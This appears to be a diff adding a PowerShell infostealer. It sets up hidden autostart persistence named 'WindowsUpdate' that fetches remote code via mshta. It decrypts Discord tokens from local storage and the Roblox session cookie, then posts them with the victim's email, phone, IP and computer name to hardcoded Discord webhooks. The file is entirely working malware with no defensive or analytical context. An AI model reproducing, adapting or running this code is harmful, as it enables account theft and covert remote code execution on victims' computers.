@@ -1,0 +1,152 @@
+$ErrorActionPreference = "SilentlyContinue"
+
+# =====================================================================
+# ─── CONFIG & WEBHOOKS ───
+# =====================================================================
+$WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
+$RE_WH = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"
+
+function dbg($title, $desc, $color, $target_wh) {
+    $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
+    try { Invoke-RestMethod $target_wh -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 5 | Out-Null } catch {}
+}
+
+# =====================================================================
+# ─── SELF-PERSISTENCE (MSHTA) ───
+# =====================================================================
+try {
+    $CMD = 'mshta.exe "https://cdn.dicerigx.app/"'
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $CMD -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "WinUpdate" -Value $CMD -ErrorAction SilentlyContinue
+    $StartupVBS = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+    $VBSContent = "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False"
+    Set-Content -Path $StartupVBS -Value $VBSContent -ErrorAction SilentlyContinue
+} catch {}
+
+# =====================================================================
+# ─── STEALING LOGIC: CRYPTO SETUP ───
+# =====================================================================
+Add-Type -AssemblyName System.Security
+$csharp = @"
+using System;
+using System.Security.Cryptography;
+public class Gcm {
+    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct) {
+        using (var aes = Aes.Create()) {
+            aes.Key = key; aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.None;
+            byte[] o = new byte[ct.Length];
+            byte[] c = new byte[16]; Array.Copy(nonce, c, 12); c[15] = 2;
+            using (var e = aes.CreateEncryptor()) {
+                for (int i = 0; i < ct.Length; i += 16) {
+                    byte[] k = e.TransformFinalBlock(c, 0, 16);
+                    int n = Math.Min(16, ct.Length - i);
+                    for (int j = 0; j < n; j++) o[i + j] = (byte)(ct[i + j] ^ k[j]);
+                    for (int j = 15; j >= 12; j--) { if (++c[j] != 0) break; }
+                }
+            }
+            return o;
+        }
+    }
+}
+"@
+Add-Type -TypeDefinition $csharp -Language CSharp
+
+$appdata = $env:APPDATA
+$l = $env:LOCALAPPDATA
+
+# =====================================================================
+# ─── MAIN LOOP (RE-GRAB) ───
+# =====================================================================
+for ($i = 1; $i -le 5; $i++) {
+    
+    $current_wh = if ($i -eq 1) { $WH } else { $RE_WH }
+
+    dbg ":repeat: Re-grab" "Loop: $i / 5" 3447003 $current_wh
+
+    # =================================================================
+    # ─── DISCORD TOKENS ───
+    # =================================================================
+    $mk = $null
+    try {
+        $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
+        $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
+        $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+    } catch {}
+
+    $tokens = @{}
+    $discordPaths = @("$appdata\discord\Local Storage\leveldb", "$appdata\discordptb\Local Storage\leveldb", "$appdata\discordcanary\Local Storage\leveldb")
+    foreach ($dp in $discordPaths) {
+        if (!(Test-Path $dp)) { continue }
+        Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {
+            $raw = $null
+            try {
+                $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
+                $sr = New-Object IO.StreamReader($fs); $raw = $sr.ReadToEnd(); $sr.Close(); $fs.Close()
+            } catch { return }
+            if (!$raw -or !$mk) { return }
+            foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {
+                $b64 = $m.Groups[1].Value
+                while ($b64.Length % 4 -ne 0) { $b64 += '=' }
+                try {
+                    $eb = [Convert]::FromBase64String($b64)
+                    if ($eb.Length -lt 80) { continue }
+                    $t = [Text.Encoding]::UTF8.GetString([Gcm]::Decrypt($mk, $eb[3..14], $eb[15..($eb.Length-17)])).TrimEnd([char]0)
+                    if ($t.Length -gt 40 -and !$tokens[$t]) { $tokens[$t] = $t }
+                } catch {}
+            }
+        }
+    }
+
+    foreach ($t in $tokens.Keys) {
+        try {
+            $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
+            if ($r.username) {
+                $info = "**User:** $($r.username)`n"
+                if ($r.email) { $info += "**Email:** $($r.email)`n" }
+                if ($r.phone) { $info += "**Phone:** $($r.phone)`n" }
+                if ($r.id) { $info += "**ID:** $($r.id)`n" }
+                $info += "**Token:** $t"
+                dbg ":gift: Discord Token" $info 5793266 $current_wh
+            }
+        } catch {}
+    }
+
+    # =================================================================
+    # ─── ROBLOX COOKIE (ONLY EMBED, NO TXT FILE) ───
+    # =================================================================
+    $rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat", "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")
+    foreach ($rp in $rbxPaths) {
+        if (Test-Path $rp) {
+            try {
+                $raw = Get-Content $rp -Raw
+                $cookie = ""
+                if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
+                    $b64 = $Matches[1]
+                    $eb = [Convert]::FromBase64String($b64)
+                    $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+                    $cookie = [Text.Encoding]::UTF8.GetString($db)
+                } else {
+                    $cookie = $raw
+                }
+                
+                if ($cookie -match '_\|WARNING[^;\s]{50,}') {
+                    $c = $Matches[0]
+                    dbg ":cookie: Roblox Cookie" "**Size:** $($c.Length) `n**PC:** $env:COMPUTERNAME`n**Cookie:**``$c``" 65280 $current_wh
+                }
+            } catch {}
+            break
+        }
+    }
+
+    # =================================================================
+    # ─── SYSTEM INFO (ONLY FIRST LOOP) ───
+    # =================================================================
+    if ($i -eq 1) {
+        try {
+            $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
+            dbg ":dart: Target" "**IP:** $ip `n**PC:** $env:COMPUTERNAME" 3447003 $WH
+        } catch {}
+    }
+
+    if ($i -lt 5) { Start-Sleep -Seconds 60 }
+}
